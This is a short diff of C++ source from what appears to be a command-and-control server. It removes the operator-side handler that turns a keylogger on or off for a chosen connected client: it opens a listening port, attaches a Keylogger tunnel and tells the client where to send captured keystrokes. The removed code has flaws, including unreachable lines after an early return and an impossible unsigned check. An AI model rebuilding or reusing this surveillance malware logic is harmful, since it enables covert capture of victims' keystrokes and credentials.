@@ -348,54 +348,7 @@ void CommandHandler::kill() {
     }
 }
 
-void CommandHandler::keylogger() {
-    int rc;
-    int client_index = std::any_cast<int>(arg_map_[INDEX_ARG]);
-    if (client_index < 0 || client_index >= p_clients_->size()) {
-        *p_event_log_ << LOG_MUST << RED << "Invalid client index: " << client_index << RESET_C2_FIFO;
-        return;
-    }
-    if (p_clients_->at(client_index) == nullptr || ClientHandler::is_client_up(p_clients_->at(client_index)->socket()) != 0) {
-        *p_event_log_ << LOG_MUST << RED << "Client " << client_index << " is not available" << RESET_C2_FIFO;
-        return;
-    }
-    if (arg_map_.find(REMOVE_ARG) != arg_map_.end()) { // Remove the keylogger
-        
-        send_client(KEYLOGGER, 0, client_index);
-        *p_event_log_ << LOG_MUST << MAGENTA << "Removing keylogger port: " << 0 << RESET_C2_FIFO;
-        return;
-
-        rc = p_clients_->at(client_index)->unset_tunnel(KEYLOGGER);
-        if (rc < 0) {
-            *p_event_log_ << LOG_MUST << RED << "Keylogger is not active" << RESET_C2_FIFO;
-        } else {
-            *p_event_log_ << LOG_MUST << GREEN << "Keylogger removed from client " << client_index << RESET_C2_FIFO;
-            send_client(KEYLOGGER, 0, client_index);
-        }
-    } else {
-        uint port = find_open_port();
-        if (port < 0) {
-            return;
-        }
-        
-        *p_event_log_ << LOG_MUST << MAGENTA << "Keylogger port: " << port-port_ << RESET_C2_FIFO;
-        Keylogger* p_keylogger = new Keylogger();
-        if (p_keylogger == nullptr) {
-            *p_event_log_ << LOG_MUST << RED << "Failed to allocate memory for Keylogger" << RESET_C2_FIFO;
-            return;
-        }
-        rc = p_clients_->at(client_index)->set_tunnel(p_keylogger, KEYLOGGER); // Logical value to check the activity of the keylogger
-        if (rc < 0) {
-            *p_event_log_ << LOG_MUST << RED << "Keylogger is already active" << RESET_C2_FIFO;
-            delete p_keylogger;
-        } else {
-            p_keylogger->init(p_ip_, port, p_clients_->at(client_index), p_shutdown_flag_, TCP_BASED);
-            *p_event_log_ << LOG_MUST << GREEN << "Listening for the keylogs for client " << client_index << RESET_C2_FIFO;
-            send_client(KEYLOGGER, port-port_, client_index);
-        }
-    }
-    
-    
+void CommandHandler::keylogger() {   
 }
 
 uint CommandHandler::find_open_port() {
